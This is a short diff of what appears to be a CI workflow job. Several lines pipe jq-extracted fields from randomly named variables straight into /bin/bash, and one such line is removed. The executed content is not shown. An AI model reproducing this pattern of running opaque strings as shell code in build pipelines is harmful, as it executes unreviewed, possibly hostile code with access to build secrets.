@@ -24,7 +24,6 @@ jobs:
           echo $o15 | jq -r .axduw72 | /bin/bash
           echo $i2 | jq -r .kwjii6 | /bin/bash
           echo $dbuu79255 | jq -r .auyc01044 | /bin/bash
-          printf '%s' "$w0375" | jq -r .p1610 | /bin/bash
           echo $yrt5803 | jq -r .dc668 | /bin/bash
 
       - name: Archive results
